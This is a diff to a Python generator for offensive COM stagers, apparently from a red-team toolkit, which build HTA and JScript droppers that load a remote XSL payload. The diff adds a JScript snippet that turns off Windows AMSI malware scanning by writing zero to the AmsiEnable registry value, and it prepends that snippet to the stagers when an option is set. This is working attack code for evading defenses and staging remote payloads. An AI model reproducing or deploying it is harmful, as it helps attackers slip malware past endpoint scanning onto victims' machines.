@@ -1,6 +1,7 @@
 #!/usr/bin/python
 
-def create_com_stager(technique, filetype, awlurl, outputfile, sspayload):
+def create_com_stager(technique, filetype, awlurl, outputfile, sspayload, amsi):
+	
 	output = ""
 	cmd = ""
 
@@ -62,6 +63,17 @@ xml.async = false
 Set xsl = xml
 xsl.load \"%s\"
 xml.transformNode xsl""" % (awlurl)
+
+	js_bypass = """\nvar sh = new ActiveXObject('WScript.Shell');
+var key = "HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable";
+try{
+	var AmsiEnable = sh.RegRead(key);
+	if(AmsiEnable!=0){
+	throw new Error(1, '');
+	}
+}catch(e){
+	sh.RegWrite(key, 0, "REG_DWORD"); // neuter AMSI
+}\n\n"""
 
 ###### Outlook.CreateObject Technique
 
@@ -176,6 +188,9 @@ xml.transformNode xsl""" % (awlurl)
 
 	if(technique=="xslremote"):
 		if(filetype == "hta"):
+			if(amsi):
+				xsl_remote_js = js_bypass + xsl_remote_js
+
 			output = """<HTML>
 <HEAD>
 </HEAD>
@@ -200,7 +215,10 @@ self.close();
 </job>
 </package>""" % (xsl_remote_js)
 		elif("js" in filetype):
-			output = xsl_remote_js
+			if(amsi):
+				output = js_bypass + xsl_remote_js
+			else:
+				output = xsl_remote_js
 		elif("vbs" in filetype or "vbe" in filetype):
 			output = xsl_remote_vbs
 
